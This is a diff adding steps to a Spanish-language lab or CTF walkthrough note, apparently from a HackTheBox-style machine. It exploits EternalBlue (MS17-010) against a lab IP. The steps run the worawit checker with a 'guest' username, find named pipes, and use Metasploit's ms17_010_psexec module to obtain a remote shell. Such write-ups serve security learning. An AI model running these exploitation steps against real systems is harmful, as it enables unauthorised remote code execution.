@@ -22,6 +22,25 @@ nmap -p445 --script "vuln and safe" 10.129.58.162 -oN smbScan
 ```
 ![[Pasted image 20260916124749.png]]
 
-Identificamos que la maquina es vulnerable a *EternalBlue*, validaremos con el checker del github [[https://github.com/worawit/ms17-010]] 
+Identificamos que la maquina es vulnerable a *EternalBlue*, validaremos con el checker si se puede explotar de alguna forma usando el repositorio de github [[https://github.com/worawit/ms17-010]] 
+```Shell
+python2 checker.py 10.129.58.162
+```
+![[Pasted image 20260916125239.png]]
 
+Al darnos al inicio que todos son accesos denegados deberemos de modificar el archivo y añadir en el campo de USERNAME *guest*
+Volveremos a ejecutar el script
+![[Pasted image 20260916125529.png]]
 
+Hemos obtenido diferentes named pipes del que nos podemos aprovechar y obtener *RCE*
+Ahora con [[METASPLOIT]] podemos explotarlo
+```shell
+msfconsole
+```
+
+Usaremos el exploit de `windows/smb/ms17_010_psexec`
+```shell
+use windows/smb/ms17_010_psexec
+```
+
+Ajustaremos el `RHOST`, el `LHOST` y `SMBUSer` al ejecutarlo obtendremos una shell
